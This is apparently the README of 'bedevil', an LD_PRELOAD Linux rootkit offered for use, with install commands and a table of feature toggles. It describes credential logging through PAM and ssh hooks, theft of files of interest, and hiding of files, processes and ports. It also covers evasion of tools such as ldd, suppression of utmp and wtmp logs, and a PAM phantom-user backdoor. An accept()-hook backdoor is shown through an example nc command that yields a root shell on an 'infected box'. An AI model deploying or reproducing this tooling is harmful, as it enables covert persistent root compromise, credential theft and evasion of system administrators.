# bedevil

###### Based on my other rootkit, [vlany](https://github.com/mempodippy/vlany)
<i>bedevil is designed to be more robust, faster and efficient than vlany.</i>

## 'Aim' of bedevil
 * Ultimately, my core aim is to tidy up previously existing aspects of precursor rootkits, fix outstanding issues and create a more manageable & _robust_ system of rootkit functionalities.
 * This is in an effort to make it easier on (not just) me when it comes to managing the rootkit's different functionalities.
 * In addtion, considering the point above, I have also made an effort to optionally minimalise the amount of dependencies required to install the kit on a machine.
 * Ideally; bedevil should provide a special ease-of-use & an additional 'skeleton' infrastructure for those who should wish to make their own personal additions (or removals) to the rootkit.
 * *i.e.: new function hooks/backdoor methods, backdoor settings & configuration, or even something as simple as certain files to be copied by default*

</hr>

## Important files
*(inc/)*
 * [__toggles.h__](https://github.com/naworkcaj/bdvl/blob/master/inc/toggles.h): rootkit functionality toggles. read for more info
 * [__stdincludes.h__](https://github.com/naworkcaj/bdvl/blob/master/inc/stdincludes.h): just standard headers
 * [__includes.h__](https://github.com/naworkcaj/bdvl/blob/master/inc/includes.h): read for info
 * [__bedevil.h__](https://github.com/naworkcaj/bdvl/blob/master/inc/bedevil.h): essential rootkit header, handled solely by bedevil.sh
 * [__bedevil.c__](https://github.com/naworkcaj/bdvl/blob/master/inc/bedevil.c): centre for all bedevil

*(inc/\*)* (header include directories may have their own exclusive files)
 * __arrays__: list of arrays to write, with respective array elements
 * __consts__: background consts that the user doesn't really need to see

 *(examples)*
 * [__inc/hooks/libdl/arrays__](https://github.com/naworkcaj/bdvl/blob/master/inc/hooks/libdl/arrays) (contains arrays of function names)
 * [__inc/hiding/arrays__](https://github.com/naworkcaj/bdvl/blob/master/inc/hiding/arrays) (scary things to hide from)
 * [__inc/hooks/open/arrays__](https://github.com/naworkcaj/bdvl/blob/master/inc/hooks/open/arrays) (files of interest to potentially steal)
 * [__inc/hooks/open/consts__](https://github.com/naworkcaj/bdvl/blob/master/inc/hooks/open/consts) (files & paths to intercept)

</hr>

## bedevil.sh
```
$ ./bedevil.sh -h

   /$$                     /$$                   /$$/$$
  | $$                    | $$                  |__| $$
  | $$$$$$$  /$$$$$$  /$$$$$$$ /$$$$$$ /$$    /$$/$| $$
  | $$__  $$/$$__  $$/$$__  $$/$$__  $|  $$  /$$| $| $$
  | $$  \ $| $$$$$$$| $$  | $| $$$$$$$$\  $$/$$/| $| $$
  | $$  | $| $$_____| $$  | $| $$_____/ \  $$$/ | $| $$
  | $$$$$$$|  $$$$$$|  $$$$$$|  $$$$$$$  \  $/  | $| $$
  |_______/ \_______/\_______/\_______/   \_/   |__|__/
                                                     
               LD_PRELOAD Linux rootkit

  Usage: $0 [option(s)]
      Options:
          -h: Show this help message & exit.
          -v: Output verbosely.
          -e: Do an environment check. (RECOMMENDED)
          -u: Enable use of 'dialog' throughout setup.
          -t: Go through & switch rootkit toggles.
          -C: Clean up installation/compilation mess.
          -d: Configure rootkit headers & settings.
          -z: After configuration has finished, compress the resulting
              new include directory with gzip.
          -c: Compile rootkit in current directory & exit.
          -D: Install all potential required dependencies. (REQUIRES ROOT)
          -i: Launch full installation of bedevil. (REQUIRES ROOT)

```
 * *Compile only (no installation):* `./bedevil.sh -dc` (will quickly compile the .so in the your cwd)  
 * *Changing variable values (example):* `BD_UNAME=my_uname BD_PWD=my_pwd ./bedevil.sh -dc`  
 * *Full installation:* `./bedevil.sh -ti` (will ask what you want to enable/disable then launch installation)
 * *Mimic installation:* `LDSO_PRELOAD=/tmp/fakepreload ./bedevil.sh -i` (mimic rootkit installation/setup without preloading the rootkit)
 * **Compressing include directory & using resulting tarball**:
 *   * Compressing: `BD_UNAME=myuname BD_PWD=mypassword ... ./bedevil.sh -vzd`
 *   * Using tarball: `TARBALL=./pathto.tar.gz ./bedevil.sh ...`
 *     * i.e.: `TARBALL=./pathto.tar.gz ./bedevil.sh -i/-c`

</hr>

## Rootkit toggles
 * [`inc/toggles.h`](https://github.com/naworkcaj/bdvl/blob/master/inc/toggles.h) is just exactly as it sounds. By (un)defining different toggle definitions, you have more control what bedevil can & will do upon installation. Comments available.  
 * [`etc/toggles.sh`](https://github.com/naworkcaj/bdvl/blob/master/etc/toggles.sh) is used by bedevil.sh to read, parse, and make changes to toggles.h without manual editing.

| Toggle           | Info                                                         | Default status | Dependency | Ignored(?) |
| :-------------   | :----------------------------------------------------------- | :------------- | :--------- | :--------- |
| `USE_ACCEPT_BD`  | allows backdoor connection via running (& infected) services | off            | -          | no         |
| `USE_PAM_BD`     | allows interactive login as a backdoor user via ssh          | off            | libpam     | no         |
| `LOG_LOCAL_AUTH` | log local successful user authentications                    | off            | libpam     | no         |
| `HIDE_SELF`      | hides files and processes based on rootkit magic GID         | on             | -          | yes        |
| `HIDE_HOOKS`     | hides malicious function hooking from dlsym                  | on             | -          | yes        |
| `FORGE_MAPS`     | hides rootkit presence from process map files                | on             | -          | yes        |
| `HIDE_PORTS`     | hides ports & port ranges defined in 'hide_ports' file       | on             | -          | yes        |
| `DO_REINSTALL`   | maintains the rootkit's preload file                         | on             | -          | yes        |
| `DO_EVASIONS`    | hides rootkit presence from unsavoury processes              | on             | -          | yes        |
| `BLOCK_STRINGS`  | prevents users from calling strings on certain files         | on             | -          | yes        |
| `LOG_SSH`        | logs outgoing ssh logins to install dir                      | off            | -          | no         |
| `FILE_STEAL`     | attempts to steal FoI when opened by open/fopen              | off            | -          | no         |
| `LINK_IF_ERR`    | link said FoI if we can't copy it                            | off            | -          | yes        |
| `USE_CRYPT`      | to use or not to use libcrypt                                | on             | libcrypt   | yes        |
| `ACCEPT_USE_SSL` | to use SSL or not for the accept hook backdoor               | off            | libssl     | no         |
| `EXEC_PRE_SHELL` | execute command to welcome us into accept backdoor           | on             | -          | yes        |

</hr>

## Feature information

#### Credential logging
 * When toggle `LOG_LOCAL_AUTH` is defined, bedevil intercepts function `pam_vprompt` and stores successful user authentications in the rootkit's installation directory.
 * When toggle `LOG_SSH` is defined, bedevil intercepts functions `read` and `write` to check if a user is attempting to log into an account via ssh.
   * It's up to you to verify if the credentials used for logging into the account are correct, since the server in question will handle that.
   * The written logs are available, too, in the rootkit's installation directory.

### Evasions & presence hiding

#### Network port hiding
 * With bedevil installed, you can manually hide or unhide any specific ports/ranges on the box by editing the `hide_ports` file in the rootkit's installation directory.
 * Additionally, before any configuration/setup, you can define what ports/ranges will be hidden by writing them to `inc/hide_ports`.
i.e.:
```
$ cat hide_ports
4291
304-306
1000-1003
```
*Where a hyphen represents a range...*
 * During configuration, `bedevil.sh` will write which ports or port ranges should be hidden to the `hide_ports` file.

#### Rootkit presence hiding
 * bedevil will hide itself from the process memory map files upon being read.
 * Reading `/proc/*/*maps`, when bedevil is fully installed will make it seem apparent that there is no malicious libraries being preloaded.
 * _HOWEVER_, should dependencies be required by the rootkit's compiled shared object, the dependent libraries will be visible in output. (namely; libcrypt & libssl)

##### `scary_*`
 * `inc/hiding/arrays` defines what bedevil will see as potentially problematic - processes, paths or environment variables.
 * bedevil compares against these lists whenever something is being executed on the box after full installation.
 * Subsequently subverting detection by temporarily 'uninstalling' the rootkit until given scary item has finished execution.
 * i.e.: Calling `ldd` on a dynamically linked binary will not reveal the location of the rootkit.
   * Initially, calling `ldd` as a regular user will appear to show an incorrect permissions error, as the regular user doesn't have sufficient permissions required to be able to temporarily uninstall the rootkit.
   * Calling `ldd` with sufficient permissions will uninstall the rootkit, show "clean" output to the user, then will reinstall. Obscuring the location of the rootkit.
   * This applies to anything executed or set defined within `inc/hiding/arrays`.

#### Backdoor
Within bedevil, you can choose to use the PAM backdoor and/or the accept hook backdoor. There are pros and cons to using either method. In order to choose which backdoor method you would like to use, see the 'toggles' section closer to the beginning of this README. Also, there is a [README inside the rootkit's installation directory](https://github.com/naworkcaj/bdvl/blob/master/etc/BD_README) that you may wish to consult.

##### PAM
 * By hijacking libpam's authentication functions, we create a phantom user on the machine that can be logged into just the same as any other user.
 * During setup, you'll be given a username and password which can be used to log into the backdoor, over ssh.
   * To reiterate, by default the username and password are randomly generated, but you can specify a username and password of your own by setting them before running `bedevil.sh`.
     * i.e.: `BD_UNAME=myusername BD_PWD=mypassword ./bedevil.sh ...`
 * See [ssh.sh](https://gist.github.com/naworkcaj/290162d025925d88e4820a7c0056418a) on connecting to the infected box's PAM backdoor with your hidden port.
 * *By hooking the responsible [utmp & wtmp functions](https://github.com/naworkcaj/bdvl/tree/master/inc/utmp), information that may give off indication of a PAM backdoor is throttled.*
 * *On boxes that use `systemd` (which is most), when a user (real-or-not) is logged in, a process called `(sd-pam)` will be visible.*

| Pros                              | Cons                           |
| :-------------------------------- | :----------------------------- |
| secure connection over ssh        | wtmp and utmp logging          |
| fully interactive shell           | PAM logins can be disabled     |

##### accept() hook
 * By intercepting and hijacking libc's accept(), we can connect to existing services (__assuming they have been restarted upon installation__) on a box and have them drop us a reverse shell if special conditions are met.
 * When using `ACCEPT_PORT` as your local source port when connecting to said box, bedevil will drop you the shell when you correctly enter your backdoor password. (`BD_PWD`)
 * `ACCEPT_PORT` is by default a hidden port in `'hide_ports'`.

###### SSL
 * If toggle `ACCEPT_USE_SSL` is defined, the source port you should use to trigger the use of SSL within the backdoor is just `$ACCEPT_PORT + 1`.
   * *The plaintext backdoor is still available even when `ACCEPT_USE_SSL` is defined.*


 * Example connection to infected box (*where host is `213.82.46.164`, `ACCEPT_PORT` is 839 & `BD_PWD` is `'my_password'`*)
```
$ nc 213.82.46.164 22 -p 839
my_password
...
uid=0(root) gid=666 groups=666
...
```

| Pros                                         | Cons                                    |
| :------------------------------------------- | :-------------------------------------- |
| not as much need to worry about logs         | plaintext unless using SSL              |
| fast                                         | not an interactive shell. but can be    |
| doesn't require miscellaneous backdoor files | requires running & infected services    |

<!-- `while true; do ldd /bin/echo; done` :< -->
